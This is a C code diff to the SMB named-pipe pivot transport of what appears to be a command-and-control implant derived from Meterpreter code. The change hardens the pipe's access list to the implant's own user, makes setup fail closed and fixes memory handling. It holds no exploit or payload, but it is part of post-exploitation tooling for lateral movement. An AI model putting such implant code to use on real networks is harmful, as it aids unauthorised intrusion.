@@ -12,8 +12,15 @@ BOOL SmbSend( PBUFFER Send )
         SMB_PIPE_SEC_ATTR   SmbSecAttr   = { 0 };
         SECURITY_ATTRIBUTES SecurityAttr = { 0 };
 
-        /* Setup attributes to allow "anyone" to connect to our pipe */
-        SmbSecurityAttrOpen( &SmbSecAttr, &SecurityAttr );
+        /* Setup attributes so only our own user can connect to the pipe.
+         * fail closed: if this fails we don't create the pipe at all,
+         * an insecure pipe is worse than no pipe. */
+        if ( ! SmbSecurityAttrOpen( &SmbSecAttr, &SecurityAttr ) )
+        {
+            PUTS( "Failed to setup pipe security attributes" )
+            SmbSecurityAttrFree( &SmbSecAttr );
+            return FALSE;
+        }
 
         Instance->Config.Transport.Handle = Instance->Win32.CreateNamedPipeW( Instance->Config.Transport.Name,  // Named Pipe
                                                                             PIPE_ACCESS_DUPLEX,              // read/write access
@@ -159,27 +166,27 @@ BOOL SmbRecv( PBUFFER Resp )
 
 /* Took it from https://github.com/rapid7/metasploit-payloads/blob/master/c/meterpreter/source/metsrv/server_pivot_named_pipe.c#L286
  * But seems like MeterPreter doesn't free everything so let's do this too. */
-VOID SmbSecurityAttrOpen( PSMB_PIPE_SEC_ATTR SmbSecAttr, PSECURITY_ATTRIBUTES SecurityAttr )
+BOOL SmbSecurityAttrOpen( PSMB_PIPE_SEC_ATTR SmbSecAttr, PSECURITY_ATTRIBUTES SecurityAttr )
 {
     SID_IDENTIFIER_AUTHORITY SidLabel       = SECURITY_MANDATORY_LABEL_AUTHORITY;
     EXPLICIT_ACCESSW         ExplicitAccess = { 0 };
     DWORD                    Result         = 0;
-    PACL                     DAcl           = NULL;
     HANDLE                   hToken         = NULL;
     PTOKEN_USER              UserToken      = NULL;
     ULONG                    TokenLength    = 0;
     /* zero them out. */
     MemSet( SmbSecAttr,   0, sizeof( SMB_PIPE_SEC_ATTR ) );
-    MemSet( SecurityAttr, 0, sizeof( PSECURITY_ATTRIBUTES ) );
+    MemSet( SecurityAttr, 0, sizeof( SECURITY_ATTRIBUTES ) );
 
     /* resolve the SID of the user we are running as. the pipe is only
      * meant for our own pivot children (which run as the same user),
-     * not for every local user. if we can't resolve it, fail closed:
-     * no security attributes means the pipe creation fails. */
+     * not for every local user. if any step fails, fail closed: the
+     * caller won't create the pipe without these security attributes.
+     * partial allocations are cleaned up by SmbSecurityAttrFree. */
     if ( ! NT_SUCCESS( SysNtOpenProcessToken( NtCurrentProcess(), TOKEN_QUERY, &hToken ) ) )
     {
         PRINTF( "NtOpenProcessToken failed: %x\n", NtGetLastError() );
-        return;
+        return FALSE;
     }
 
     SysNtQueryInformationToken( hToken, TokenUser, NULL, 0, &TokenLength );
@@ -187,7 +194,7 @@ VOID SmbSecurityAttrOpen( PSMB_PIPE_SEC_ATTR SmbSecAttr, PSECURITY_ATTRIBUTES Se
     {
         PRINTF( "NtQueryInformationToken failed: %x\n", NtGetLastError() );
         SysNtClose( hToken );
-        return;
+        return FALSE;
     }
 
     UserToken = MmHeapAlloc( TokenLength );
@@ -199,7 +206,7 @@ VOID SmbSecurityAttrOpen( PSMB_PIPE_SEC_ATTR SmbSecAttr, PSECURITY_ATTRIBUTES Se
         if ( UserToken ) {
             DATA_FREE( UserToken, TokenLength );
         }
-        return;
+        return FALSE;
     }
 
     SysNtClose( hToken );
@@ -212,12 +219,14 @@ VOID SmbSecurityAttrOpen( PSMB_PIPE_SEC_ATTR SmbSecAttr, PSECURITY_ATTRIBUTES Se
     ExplicitAccess.Trustee.TrusteeType  = TRUSTEE_IS_USER;
     ExplicitAccess.Trustee.ptstrName    = UserToken->User.Sid;
 
-    Result = Instance->Win32.SetEntriesInAclW( 1, &ExplicitAccess, NULL, &DAcl );
+    Result = Instance->Win32.SetEntriesInAclW( 1, &ExplicitAccess, NULL, &SmbSecAttr->DAcl );
     if ( Result != ERROR_SUCCESS )
     {
         PRINTF( "SetEntriesInAclW failed: %u\n", Result );
+        DATA_FREE( UserToken, TokenLength );
+        return FALSE;
     }
-    PRINTF( "DACL: %p\n", DAcl );
+    PRINTF( "DACL: %p\n", SmbSecAttr->DAcl );
 
     /* the SID has been copied into the ACL at this point */
     DATA_FREE( UserToken, TokenLength );
@@ -225,6 +234,7 @@ VOID SmbSecurityAttrOpen( PSMB_PIPE_SEC_ATTR SmbSecAttr, PSECURITY_ATTRIBUTES Se
     if ( ! Instance->Win32.AllocateAndInitializeSid( &SidLabel, 1, SECURITY_MANDATORY_LOW_RID, 0, 0, 0, 0, 0, 0, 0, &SmbSecAttr->SidLow ) )
     {
         PRINTF( "AllocateAndInitializeSid failed: %u\n", NtGetLastError() );
+        return FALSE;
     }
     PRINTF( "sidLow: %p\n", SmbSecAttr->SidLow );
 
@@ -232,11 +242,13 @@ VOID SmbSecurityAttrOpen( PSMB_PIPE_SEC_ATTR SmbSecAttr, PSECURITY_ATTRIBUTES Se
     if ( ! Instance->Win32.InitializeAcl( SmbSecAttr->SAcl, MAX_PATH, ACL_REVISION_DS ) )
     {
         PRINTF( "InitializeAcl failed: %u\n", NtGetLastError() );
+        return FALSE;
     }
 
     if ( ! Instance->Win32.AddMandatoryAce( SmbSecAttr->SAcl, ACL_REVISION_DS, NO_PROPAGATE_INHERIT_ACE, 0, SmbSecAttr->SidLow ) )
     {
         PRINTF( "AddMandatoryAce failed: %u\n", NtGetLastError() );
+        return FALSE;
     }
 
     // now build the descriptor
@@ -244,21 +256,26 @@ VOID SmbSecurityAttrOpen( PSMB_PIPE_SEC_ATTR SmbSecAttr, PSECURITY_ATTRIBUTES Se
     if ( ! Instance->Win32.InitializeSecurityDescriptor( SmbSecAttr->SecDec, SECURITY_DESCRIPTOR_REVISION ) )
     {
         PRINTF( "InitializeSecurityDescriptor failed: %u\n", NtGetLastError() );
+        return FALSE;
     }
 
-    if ( ! Instance->Win32.SetSecurityDescriptorDacl( SmbSecAttr->SecDec, TRUE, DAcl, FALSE ) )
+    if ( ! Instance->Win32.SetSecurityDescriptorDacl( SmbSecAttr->SecDec, TRUE, SmbSecAttr->DAcl, FALSE ) )
     {
         PRINTF( "SetSecurityDescriptorDacl failed: %u\n", NtGetLastError() );
+        return FALSE;
     }
 
     if ( ! Instance->Win32.SetSecurityDescriptorSacl( SmbSecAttr->SecDec, TRUE, SmbSecAttr->SAcl, FALSE ) )
     {
         PRINTF( "SetSecurityDescriptorSacl failed: %u\n", NtGetLastError() );
+        return FALSE;
     }
 
     SecurityAttr->lpSecurityDescriptor = SmbSecAttr->SecDec;
     SecurityAttr->bInheritHandle       = FALSE;
     SecurityAttr->nLength              = sizeof( SECURITY_ATTRIBUTES );
+
+    return TRUE;
 }
 
 VOID SmbSecurityAttrFree( PSMB_PIPE_SEC_ATTR SmbSecAttr )
@@ -279,6 +296,13 @@ VOID SmbSecurityAttrFree( PSMB_PIPE_SEC_ATTR SmbSecAttr )
     {
         MmHeapFree( SmbSecAttr->SAcl );
         SmbSecAttr->SAcl = NULL;
+    }
+
+    /* allocated by SetEntriesInAclW, must be freed with LocalFree */
+    if ( SmbSecAttr->DAcl )
+    {
+        Instance->Win32.LocalFree( SmbSecAttr->DAcl );
+        SmbSecAttr->DAcl = NULL;
     }
 
     if ( SmbSecAttr->SecDec )
